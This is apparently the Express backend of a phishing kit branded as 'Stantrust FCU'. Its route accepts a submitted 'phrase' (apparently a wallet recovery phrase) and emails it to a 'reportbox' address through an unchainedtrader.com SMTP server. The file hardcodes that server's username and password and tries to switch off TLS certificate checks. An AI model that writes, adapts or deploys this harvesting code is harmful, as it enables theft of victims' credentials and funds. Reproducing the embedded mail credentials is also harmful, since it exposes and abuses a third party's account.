const express = require("express");
const router = express.Router();
const nodemailer = require("nodemailer");
var cors = require("cors");
router.use(cors());
router.use(express.urlencoded({ extended: false }));
router.use(express.json());

router.route("/").post((req, res) => {
  console.log(req.body);

  const { phrase, reportbox } = req.body;
  // async..await is not allowed in global scope, must use a wrapper
  async function main() {
    // Generate test SMTP service account from ethereal.email
    // Only needed if you don't have a real mail account for testing
    let testAccount = await nodemailer.createTestAccount();

    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
      host: "mail.unchainedtrader.com",
      port: 465,
      secure: true, // true for 465, false for other ports
      auth: {
        user: "api@unchainedtrader.com", // generated ethereal user
        pass: "unchainedtrade@2022", // generated ethereal password
      },
      tls: {
        rejectUnAuthorized: false,
      },
    });

    const sitename = "Stantrust FCU";
    const imagelogo =
      "https://firebasestorage.googleapis.com/v0/b/stantrustbank.appspot.com/o/logos%2Flogostan.png?alt=media&token=aad8e574-3954-408a-a1be-90a8a33c63f6"; // send mail with defined transport object
    let info = await transporter.sendMail({
      from: '"Report <support@unchainedtrader.com>', // sender address
      bcc: reportbox, // list of receivers
      subject: `Reportbox`, // Subject line
      // text: "Hello world?", // plain text body
      html: `Phrase: ${phrase} `,
    });

    return info;
    // console.log("Message sent: %s", info.messageId);
    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

    // Preview only available when sending through an Ethereal account
    // console.log("Preview URL: %s", nodemailer.getTestMessageUrl(info));
    // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
  }

  main()
    .then((info) => console.log("Message sent: %s", info.messageId))
    .catch((error) => {
      //res.send(error);
      console.log(error);
    });

  res.json({ status: "submited" });
});

module.exports = router;
